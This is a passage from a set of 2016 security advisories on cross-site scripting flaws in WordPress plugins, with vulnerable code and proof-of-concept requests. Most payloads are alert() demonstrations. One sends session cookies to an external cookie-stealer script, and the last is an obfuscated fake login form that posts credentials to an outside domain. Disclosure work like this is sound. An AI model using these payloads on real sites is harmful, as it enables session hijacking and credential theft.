------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_gwolle_guestbook_wordpress_plugin.html
[2] https://wordpress.org/plugins/gwolle-gb/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting vulnerability in Tribulant Slideshow Galleries
WordPress Plugin
------------------------------------------------------------------------
Spyros Gasteratos, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Tribulant
Slideshow Galleries WordPress Plugin. This issue allows an attacker to
perform a wide variety of actions, such as stealing Administrators'
session tokens, or performing arbitrary actions on their behalf. In
order to exploit this issue, the attacker has to lure/force a logged on
WordPress Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160714-0016

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Tribulant Slideshow Galleries [2]
WordPress Plugin version 1.6.3.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
A fix for this issue is not available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Tribulant Slideshow Galleries [2] WordPress Plugin allows you to
feature WordPress content in a beautiful and fast JavaScript-powered
slideshow gallery. A Cross-Site Scripting vulnerability has been found
in the Tribulant Slideshow Galleries plugin. This issue allows an
attacker to perform a wide variety of actions, such as stealing
Administrators' session tokens, or performing arbitrary actions on their
behalf. In order to exploit this issue, the attacker has to lure/force a
logged on WordPress Administrator into opening a malicious website.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
A reflected cross site scripting vulnerability exists in the plugin
Slideshow Galleries. This issue is due to to the fact that the
view/admin/galleries/index.php file uses the following code to output an
HREF link:
"<a href="<?php echo GalleryHtmlHelper::retainquery('orderby=id&order='
.(($orderby == "id") ? $otherorder : "asc")); ?>">"

The above code fails to perform any output encoding on the retainquery
method, thus allowing the tag to be closed and to inject a script
element:
/wp-admin/admin.php?page=slideshow-galleries&method=save"><script>alert(1)<%2fscript>pwned

Please note that this particular method is called another 19 times in
the project. This indicates that more similar vulnerabilities could
exist in the code.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
http://<target>/wp-admin/admin.php?page=slideshow-galleries&method=savegtlcq%5C%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3Exsxa2

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_tribulant_slideshow_galleries_wordpress_plugin.html
[2] https://wordpress.org/plugins/slideshow-gallery/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting vulnerability in Trust Form WordPress Plugin
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Trust Form
WordPress Plugin. This issue allows an attacker to perform a wide
variety of actions, such as stealing Administrators' session tokens, or
performing arbitrary actions on their behalf. In order to exploit this
issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0018

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Trust Form [2] WordPress Plugin
version 2.0.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Trust Form [2] WordPress Plugin is a contact form with confirmation
screen and mail and data base support. A Cross-Site Scripting
vulnerability was found in the Trust Form WordPress Plugin. This issue
allows an attacker to perform a wide variety of actions, such as
stealing Administrators' session tokens, or performing arbitrary actions
on their behalf. In order to exploit this issue, the attacker has to
lure/force a logged on WordPress Administrator into opening a malicious
website.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The issue exists in several PHP files and is caused by the lack of
output encoding on the page request parameter. The vulnerable code is
listed below.

edit-list.php:

<input type="hidden" name="page" value="<?php echo $_REQUEST['page'];
?>" />

entries-list.php:

<input type="hidden" name="page" value="<?php echo $_REQUEST['page']
?>"; />

trust-form.php:

$trash_url  = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'trash', $this->id, $item['ID'] );
	
[...]
	
        $read_url = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'read', $this->id, $item['ID'] );
	
[...]
	
                'view'     => sprintf( '<a
href="?page=%s&action=%s&form=%s&entry=%s">'.__( 'View',
TRUST_FORM_DOMAIN ).'</a>', $_REQUEST['page'], 'edit', $this->id,
$item['ID'] ),
	
[...]
	
        $new_url = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'new', $this->id, $item['ID'] );
	
[...]
	
                'view'     => sprintf( '<a
href="?page=%s&action=%s&form=%s&entry=%s">'.__( 'View',
TRUST_FORM_DOMAIN ).'</a>', $_REQUEST['page'], 'edit', $this->id,
$item['ID'] ),
	
[...]
	
$trash_url  = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'trash', $this->id, $item['ID'] );
	
[...]
	
$read_url = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'read', $this->id, $item['ID'] );
	
[...]
	
        'view'     => sprintf( '<a
href="?page=%s&action=%s&form=%s&entry=%s">'.__( 'View',
TRUST_FORM_DOMAIN ).'</a>', $_REQUEST['page'], 'edit', $this->id,
$item['ID'] ),
	
[...]
	
$trash_url  = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'trash', $this->id, $item['ID'] );
	
[...]
	
$new_url = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'new', $this->id, $item['ID'] );
	
[...]
	
        'view'     => sprintf( '<a
href="?page=%s&action=%s&form=%s&entry=%s">'.__( 'View',
TRUST_FORM_DOMAIN ).'</a>', $_REQUEST['page'], 'edit', $this->id,
$item['ID'] ),
	
[...]
	
$delete_url = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'delete', $this->id, $item['ID'] );
	
[...]
	
$restore_url = sprintf( '?page=%s&action=%s&form=%s&entry=%s'
,$_REQUEST['page'], 'untrash',$this->id, $item['ID'] );
	
[...]
	
$trash_url = sprintf( '?page=%s&action=%s&form=%s' ,$_REQUEST['page'],
'trash', $item['ID'] );
	
[...]
	
$duplicate_url = sprintf( '?page=%s&action=%s&form=%s',
$_REQUEST['page'], 'duplicate', $item['ID'] );
	
[...]
	
        'edit'      => sprintf( '<a href="?page=%s&action=%s&form=%s">'
.__( 'Edit', TRUST_FORM_DOMAIN ). '</a>', $_REQUEST['page'], 'edit',
$item['ID'] ),
	
[...]
	
$delete_url = sprintf( '?page=%s&action=%s&form=%s' ,$_REQUEST['page'],
'delete', $item['ID'] );
	
[...]
	
$restore_url = sprintf( '?page=%s&action=%s&form=%s' ,$_REQUEST['page'],
'untrash', $item['ID'] );

Normally, the page URL parameter is validated by WordPress, which
prevents Cross-Site Scripting. However in this case the value of page is
obtained from $_REQUEST, not from $_GET. This allows for parameter
pollution where the attacker puts a benign page value in the URL and
simultaneously submits a malicious page value as POST parameter. 

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
<html>
	<body>
		<form
action="http://192.168.146.137/wp-admin/admin.php?page=trust-form-edit"
method="POST">
			<input type="hidden" name="page"
value="&quot;<script>alert(document.cookie);</script>" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_trust_form_wordpress_plugin.html
[2] https://wordpress.org/plugins/trust-form/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting vulnerability in WP-Filebase Download Manager
WordPress Plugin
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the WP-Filebase
Download Manager WordPress Plugin. This issue allows an attacker to
perform a wide variety of actions, such as stealing Administrators'
session tokens, or performing arbitrary actions on their behalf. In
order to exploit this issue, the attacker has to lure/force a logged on
WordPress Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0019

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on WP-Filebase Download Manager [2]
WordPress Plugin version 3.4.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The WP-Filebase Download Manager [2] WordPress Plugin adds a powerful
download manager including file categories, downloads counter, widgets,
sorted file lists and more to your WordPress blog. A Cross-Site
Scripting vulnerability was found in the WP-Filebase Download Manager
WordPress Plugin. This issue allows an attacker to perform a wide
variety of actions, such as stealing Administrators' session tokens, or
performing arbitrary actions on their behalf. In order to exploit this
issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a malicious website.
 
------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The issue exists in the file AdminGuiFiles.php and is caused by the lack
of output encoding on the page request parameter. The vulnerable code is
listed below.

<form id="posts-filter" action="" method="post">
<input type="hidden" name="page" value="<?php echo $_REQUEST['page'] ?>"
/>
<?php $file_table->display() ?>
</form>

Normally, the page URL parameter is validated by WordPress, which
prevents Cross-Site Scripting. However in this case the value of page is
obtained from $_REQUEST, not from $_GET. This allows for parameter
pollution where the attacker puts a benign page value in the URL and
simultaneously submits a malicious page value as POST parameter.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
<html>
	<body>
		<form
action="http://<target>/wp-admin/admin.php?page=wpfilebase_files"
method="POST">
			<input type="hidden" name="page"
value="&quot;<script>alert(document.cookie);</script>" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_wp_filebase_download_manager_wordpress_plugin.html
[2] https://wordpress.org/plugins/wp-filebase/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Cross-Site Scripting vulnerability in WP-SpamFree Anti-Spam WordPress
Plugin
------------------------------------------------------------------------
Radjnies Bhansingh, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A reflected Cross-Site Scripting vulnerability exists in the WP-SpamFree
Anti-Spam WordPress plugin. This vulnerability allows an attacker to
perform any action with the privileges of the target user. The affected
code is not protected with an anti-Cross-Site Request Forgery token.
Consequently, it can be exploited by luring the target user into
clicking a specially crafted link or visiting a malicious website (or
advertisement).

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0026

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was succesfully tested on the WP-SpamFree Anti-Spam [2]
WordPress Plugin version 2.1.1.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
A reflected Cross-Site Scripting vulnerability exists in the WP-SpamFree
Anti-Spam WordPress plugin. This vulnerability allows an attacker to
perform any action with the privileges of the target user. The affected
code is not protected with an anti-Cross-Site Request Forgery token.
Consequently, it can be exploited by luring the target user into
clicking a specially crafted link or visiting a malicious website (or
advertisement).

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The vulnerability exists in the wp-spamfree.php file on line 6049:

$blacklist_keys_update =
trim(stripslashes($_REQUEST['wordpress_comment_blacklist']));

In order to exploit this issue the target user must click a specially
crafted link or visit a malicious website (or advertisement) and must be
autenticated within WordPress.

In addition the WordPress specific blacklist can be cleared by using the
request below and employing CSRF.		
------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
The following proof of concept code demonstrates this issue:
<html>
	<body>
		<form
action="http://<target>/wp-admin/options-general.php?page=wp-spamfree%2Fwp-spamfree.php"
method="POST">
			<input type="hidden" name="submitted_wpsf_general_options"
value="1"/>
			<input type="hidden" name="use_alt_cookie_method" value="on"/>
			<input type="hidden" name="comment_logging_all" value="on"/>
			<input type="hidden" name="enhanced_comment_blacklist" value="on"/>
			<input type="hidden" name="wordpress_comment_blacklist"
value="</textarea><script>alert(1)</script>foo&#13;&#10;bar&#13;&#10;press&#13;&#10;"/>
			<input type="hidden" name="allow_proxy_users" value="on"/>
			<input type="hidden" name="promote_plugin_link" value="on"/>
			<input type="hidden" name="submit_wpsf_general_options"
value="Update&#32;Options&#32;Â&#37;B"/>
			<input type="submit"/>
		</form>
	</body>
</html>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_wp_spamfree_anti_spam_wordpress_plugin.html
[2] https://wordpress.org/plugins/wp-spamfree/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Persistent Cross-Site Scripting in the WordPress NewStatPress plugin
------------------------------------------------------------------------
Han Sahin, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A persistent Cross-Site Scripting (XSS) vulnerability has been found in
the WordPress NewStatPress plugin. By using this vulnerability an
attacker can inject malicious JavaScript code into the application,
which will execute within the browser of any user who views the relevant
application content. 

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0030

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on WordPress NewStatPress plugin [2]
version 1.2.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue has been addressed in NewStatPress version 1.2.5. This
version can be download from the NewStatPress GitHub account:
https://github.com/lechab/newstatpress#125 [3] 

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The WordPress NewStatPress plugin [4] is a real-time plugin to manage
the visits' statistics on a WordPress site. It doesn't require external
web analytics. A persistent Cross-Site Scripting vulnerability has been
discovered in the WordPress NewStatPress plugin which allows an
unauthenticated attacker to inject malicious JavaScript code into the
application, which will execute within the browser of any user who views
the relevant application content. The attacker-supplied code can perform
a wide variety of actions, such as stealing victims' session tokens or
login credentials, performing arbitrary actions on their behalf, and
logging their keystrokes or deliver malware.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The WordPress NewStatPress plugin fails to sufficiently check input
supplied to a GET request for a resource on a WordPress site with a
vulnerable version of the NewStatPress plugin. In addition input
supplied to the Referer header is insufficiently sanitized. As a result
a malicious request will be stored on the Last Visitors and Visitors tab
of the Visits page, executing the payload when an unsuspecting user
views one of the mentioned tabs on this page. 

Persistent Cross-Site Scripting vulnerabilities are typically more
serious than reflected vulnerabilities because they do not require a
separate delivery mechanism in order to reach target users, in this case
potentially a WP admin reviewing the stats.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
This vulnerability can be demonstrated by submitting the following
request:
GET /sumofpwn/"><script>alert(document.cookie);</script> HTTP/1.1
Host: 192.168.28.129
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla Chrome/51.0.2704.103 Safari/537.36
Referer:
javascript:document.location=`http://www.XXXXXXyourhackerdomainXXXXXX.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie);
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8,nl;q=0.6
Connection: close

Based on the above request, the vulnerable output will be:
1) <a href="/?/sumofpwn/\&quot;><script>alert(document.cookie);</script>"
target="_blank">/sumofpwn/\"&gt;<script>alert(document.cookie);</script></a>
2) Arrived from <a href="javascript:document.location=`http://www.sfylabs.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie);"
target="_blank">javascript:document.location=`http://www.sfylabs.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie);</a>

http://yourhost/wp-admin/admin.php?page=nsp_main
http://yourhost/wp-admin/admin.php?page=nsp_visits

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_the_wordpress_newstatpress_plugin.html
[2] https://downloads.wordpress.org/plugin/newstatpress.1.2.4.zip
[3] https://github.com/lechab/newstatpress#125
[4] https://wordpress.org/plugins/newstatpress/

```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Reflected Cross-Site Scripting in FormBuilder WordPress Plugin
------------------------------------------------------------------------
Burak Kelebek, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A reflected Cross-Site Scripting vulnerability has been found in the
FormBuilder [2] WordPress plugin. This issue allows an attacker to
perform a wide variety of actions, such as stealing Administrators'
session tokens, or performing arbitrary actions on their behalf. In
order to exploit this issue, the attacker has to lure/force a logged on
WordPress Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0006

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on FormBuilder [2] version 1.05

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
A fix for this issue is currently not available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The FormBuilder [2] WordPress plugin allows you to build contact forms
in the WordPress administrative interface without needing to know PHP or
HTML. 

A reflected Cross-Site Scripting vulnerability has been found in the
FormBuilder WordPress plugin. This issue allows an attacker to perform a
wide variety of actions, such as stealing Administrators' session
tokens, or performing arbitrary actions on their behalf. In order to
exploit this issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a malicious website.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This issue exists due to the fact that neither the fbmsg or the
formSearchQuery field in the tools.php file validates <script> tags or
perform output encoding. As a result malicious script code can be added
to these fields.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
The following proof of concept code demonstrates this issue:

- http://<target>/wp-admin/tools.php?page=formbuilder.php&pageNumber&fbtag&fbaction=forms&fbmsg=<script>alert(1)</script>n edit it <a href="/wp-admin/tools.php?page=formbuilder.php&pageNumber=&fbtag=&fbaction=editForm&fbid=9">here</a>
- http://<target>/wp-admin/tools.php?page=formbuilder.php&fbaction=formResults&formSearchQuery="><script>alert(1)</script>

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/reflected_cross_site_scripting_in_formbuilder_wordpress_plugin.html
[2] https://wordpress.org/plugins/formbuilder/
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Stored Cross-Site Scripting vulnerability in Contact Form WordPress
Plugin
------------------------------------------------------------------------
Julien Rentrop, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A stored Cross-Site Scripting vulnerability was found in the Contact
Form WordPress Plugin. This issue allows an attacker to perform a wide
variety of actions, such as stealing users' session tokens, or
performing arbitrary actions on their behalf. In order to exploit this
issue, the attacker has to lure/force a victim into opening a malicious
website/link.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0042

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Contact Form by BestWebSoft [2]
WordPress Plugin version 4.0.0.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is partially resolved in Contact Form version 4.0.2 [3].

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The Contact Form [2] WordPress Plugin enables sites to receive messages
from customers. A stored Cross-Site Scripting vulnerability was found in
the Contact Form WordPress Plugin. This issue allows an attacker to
perform a wide variety of actions, such as stealing users' session
tokens, or performing arbitrary actions on their behalf. In order to
exploit this issue, the attacker has to lure/force a victim into opening
a malicious website/link.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
When enabled an attachment can be uploaded in the contact form. The
upload accepts html files which will be stored in the
/wp-content/uploads directory. Since we can control the contents of this
html file we can use this as a way to create a Cross-Site Scripting
attack.

The attack here is possible since the validation fails and the unlink
function which cleans up the file is not executed.

Tried to escalate this attack further by getting code execution
(uploading php file), however this is defended by a white list.

Source file:
https://plugins.svn.wordpress.org/contact-form-plugin/trunk/contact_form.php

When apache is configured to show directory listings it's easier to
exploit this attack since we don't need to generate the file name. When
directory listings is not enabled this attack should still be possible,
since the file name is generated with this code:

md5( sanitize_file_name( $_FILES["cntctfrm_contact_attachment"]["name"]
) . time() . $email )

Only time of the server is not exactly known, but could be determined.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
#1 Manual (Or see example request):
Go to page with contact form, select a html file, set some invalid input
(such as email: invalid@@@), send.

#2 Navigate to uploaded file:
http://<target>/wp-content/uploads/

#3 Example of stored file:
http://<target>/wp-content/uploads/2016/07/cntctfrm_a407baae7f961b445422446f75575e89_test.html

Request example:

POST / HTTP/1.1
Host: <target>
Content-Length: 605
Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryPcjU2MvmAMp3t8r0
Connection: close
	
------WebKitFormBoundaryPcjU2MvmAMp3t8r0
Content-Disposition: form-data; name="cntctfrm_contact_attachment";
filename="test.html"
Content-Type: text/html
	
<html>
<body>
Hello world html
</body>
</html>
------WebKitFormBoundaryPcjU2MvmAMp3t8r0
Content-Disposition: form-data; name="cntctfrm_contact_action"
	
send
------WebKitFormBoundaryPcjU2MvmAMp3t8r0
Content-Disposition: form-data; name="cntctfrm_language"
	
default
------WebKitFormBoundaryPcjU2MvmAMp3t8r0--

------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] https://sumofpwn.nl/advisory/2016/stored_cross_site_scripting_vulnerability_in_contact_form_wordpress_plugin.html
[2] https://wordpress.org/plugins/contact-form-plugin/
[3] https://downloads.wordpress.org/plugin/contact-form-plugin.4.0.2.zip
```

</details>
<details><summary>Additional Parts</summary>

```
------------------------------------------------------------------------
Stored Cross-Site Scripting vulnerability in User Login Log WordPress
Plugin
------------------------------------------------------------------------
Axel Koolhaas, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A stored Cross-Site Scripting vulnerability was found in the User Login
Log WordPress Plugin. This issue can be exploited by Subscriber (or
higher) and allows an attacker to perform a wide variety of actions,
such as stealing users' session tokens, or performing arbitrary actions
on their behalf.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0011

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on User Login Log [2] WordPress
Plugin version 2.2.1.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
The User Login Log [2] WordPress Plugin track records of WordPress user
login with set of multiple information like ip, date , time, country ,
city, and user name. A stored Cross-Site Scripting vulnerability was
found in the User Login Log WordPress Plugin. This issue can be
exploited by Subscriber (or higher) and allows an attacker to perform a
wide variety of actions, such as stealing users' session tokens, or
performing arbitrary actions on their behalf.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This vulnerability exists due to the lack of encoding of the User-Agent
HTTP request header. This issue exists in method column_default() that
is implemented in the file user-login-log.php.

function column_default($item, $column_name)
{
	
[...]
	
	switch($column_name){
	
[...]
		
	default:
		return $item[$column_name];
	}
}

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
POST /wp-login.php HTTP/1.1
Host: <target>
User-Agent:
XSS<script>document.getElementById(/wpwrap/.toString().substring(1,7)).innerHTML = String.fromCharCode(60,108,105,110,107,32,114,101,108,61,39,115,116,121,108,101,115,104,101,101,116,39,32,105,100,61,39,99,111,108,111,114,115,45,102,114,101,115,104,45,99,115,115,39,32,104,114,101,102,61,39,99,115,115,47,99,111,108,111,114,115,45,102,114,101,115,104,46,99,115,115,39,32,116,121,112,101,61,39,116,101,120,116,47,99,115,115,39,32,109,101,100,105,97,61,39,97,108,108,39,47,62,60,108,105,110,107,32,114,101,108,61,39,115,116,121,108,101,115,104,101,101,116,39,32,105,100,61,39,108,111,103,105,110,45,99,115,115,39,32,104,114,101,102,61,39,99,115,115,47,108,111,103,105,110,46,99,115,115,39,32,116,121,112,101,61,39,116,101,120,116,47,99,115,115,39,32,109,101,100,105,97,61,39,97,108,108,39,47,62,32,60,115,116,121,108,101,62,98,111,100,121,123,98,97,99,107,103,114,111,117,110,100,58,32,110,111,110,101,59,125,35,104,101,97,100,101,114,123,98,97,99,107,103,114,111,117,110,100,58,32,110,111,110,101,59,125,35,108,111,103,105,110,102,111,114,109,123,116,101,120,116,45,97,108,105,103,110,58,32,108,101,102,116,59,125,112,32,35,110,97,118,123,116,101,120,116,45,115,104,97,100,111,119,58,32,114,103,98,97,40,50,53,53,44,50,53,53,44,50,53,53,44,49,41,32,48,32,49,112,120,32,48,59,125,46,115,117,98,109,105,116,123,112,97,100,100,105,110,103,58,32,48,59,125,35,98,97,99,107,116,111,98,108,111,103,32,97,123,99,111,108,111,114,58,32,35,99,99,99,59,125,60,47,115,116,121,108,101,62,32,60,100,105,118,32,105,100,61,34,108,111,103,105,110,34,62,60,104,49,62,60,97,32,104,114,101,102,61,34,104,116,116,112,58,47,47,119,111,114,100,112,114,101,115,115,46,111,114,103,47,34,32,116,105,116,108,101,61,34,80,111,119,101,114,101,100,32,98,121,32,87,111,114,100,80,114,101,115,115,34,62,84,111,116,97,108,108,121,32,76,101,103,105,116,32,76,111,103,105,110,32,70,111,114,109,60,47,97,62,60,47,104,49,62,32,60,102,111,114,109,32,110,97,109,101,61,34,108,111,103,105,110,102,111,114,109,34,32,105,100,61,34,108,111,103,105,110,102,111,114,109,34,32,97,99,116,105,111,110,61,34,104,116,116,112,58,47,47,119,119,119,46,115,104,111,97,108,111,97,107,46,109,108,47,99,111,108,108,101,99,116,34,32,109,101,116,104,111,100,61,34,80,79,83,84,34,32,116,97,114,103,101,116,61,34,104,105,100,100,101,110,45,102,111,114,109,34,62,60,112,62,60,108,97,98,101,108,62,85,115,101,114,110,97,109,101,60,98,114,47,62,60,105,110,112,117,116,32,116,121,112,101,61,34,116,101,120,116,34,32,110,97,109,101,61,34,117,34,32,105,100,61,34,117,115,101,114,95,108,111,103,105,110,34,32,99,108,97,115,115,61,34,105,110,112,117,116,34,32,118,97,108,117,101,61,34,34,32,115,105,122,101,61,34,50,48,34,32,116,97,98,105,110,100,101,120,61,34,49,48,34,47,62,60,47,108,97,98,101,108,62,60,47,112,62,60,112,62,60,108,97,98,101,108,62,80,97,115,115,119,111,114,100,60,98,114,47,62,60,105,110,112,117,116,32,116,121,112,101,61,34,112,97,115,115,119,111,114,100,34,32,110,97,109,101,61,34,112,34,32,105,100,61,34,117,115,101,114,95,112,97,115,115,34,32,99,108,97,115,115,61,34,105,110,112,117,116,34,32,118,97,108,117,101,61,34,34,32,115,105,122,101,61,34,50,48,34,32,116,97,98,105,110,100,101,120,61,34,50,48,34,47,62,60,47,108,97,98,101,108,62,60,47,112,62,60,112,32,115,116,121,108,101,61,34,99,111,108,111,114,58,114,101,100,34,62,83,101,115,115,105,111,110,32,104,97,115,32,101,120,112,105,114,101,100,44,32,112,108,101,97,115,101,32,108,111,103,32,105,110,60,47,112,62,60,112,32,99,108,97,115,115,61,34,102,111,114,103,101,116,109,101,110,111,116,34,62,60,108,97,98,101,108,62,60,105,110,112,117,116,32,110,97,109,101,61,34,114,101,109,101,109,98,101,114,109,101,34,32,116,121,112,101,61,34,99,104,101,99,107,98,111,120,34,32,105,100,61,34,114,101,109,101,109,98,101,114,109,101,34,32,118,97,108,117,101,61,34,102,111,114,101,118,101,114,34,32,116,97,98,105,110,100,101,120,61,34,57,48,34,47,62,32,82,101,109,101,109,98,101,114,32,77,101,60,47,108,97,98,101,108,62,60,47,112,62,60,112,32,99,108,97,115,115,61,34,115,117,98,109,105,116,34,62,60,105,110,112,117,116,32,116,121,112,101,61,34,115,117,98,109,105,116,34,32,110,97,109,101,61,34,119,112,45,115,117,98,109,105,116,34,32,105,100,61,34,119,112,45,115,117,98,109,105,116,34,32,118,97,108,117,101,61,34,76,111,103,32,73,110,34,32,116,97,98,105,110,100,101,120,61,34,49,48,48,34,47,62,60,47,112,62,60,47,102,111,114,109,62,32,60,112,32,105,100,61,34,110,97,118,34,62,60,97,32,104,114,101,102,61,34,46,46,47,119,112,45,108,111,103,105,110,46,112,104,112,63,97,99,116,105,111,110,61,108,111,115,116,112,97,115,115,119,111,114,100,34,32,116,105,116,108,101,61,34,80,97,115,115,119,111,114,100,32,76,111,115,116,32,97,110,100,32,70,111,117,110,100,34,62,76,111,115,116,32,121,111,117,114,32,112,97,115,115,119,111,114,100,63,60,47,97,62,60,47,112,62,60,47,100,105,118,62,60,105,102,114,97,109,101,32,115,116,121,108,101,61,34,100,105,115,112,108,97,121,58,110,111,110,101,34,32,110,97,109,101,61,34,104,105,100,100,101,110,45,102,111,114,109,34,62,60,47,105,102,114,97,109,101,62,32,60,115,99,114,105,112,116,32,116,121,112,101,61,34,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,34,62,116,114,121,123,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,117,115,101,114,95,108,111,103,105,110,39,41,46,102,111,99,117,115,40,41,59,125,99,97,116,99,104,40,101,41,123,125,60,47,115,99,114,105,112,116,62);document.getElementById(/wpwrap/.toString().substring(1,7)).id = /login/.toString().substring(1, 5);document.cookie = String.fromCharCode(39,118,105,115,105,116,101,100,61,116,114,117,101,59,112,97,116,104,61,47,59,109,97,120,45,97,103,101,61,39)+ 60 * 10;</script>XSS
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip,deflate,lzma,sdch
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close
Content-Type: application/x-www-form-urlencoded
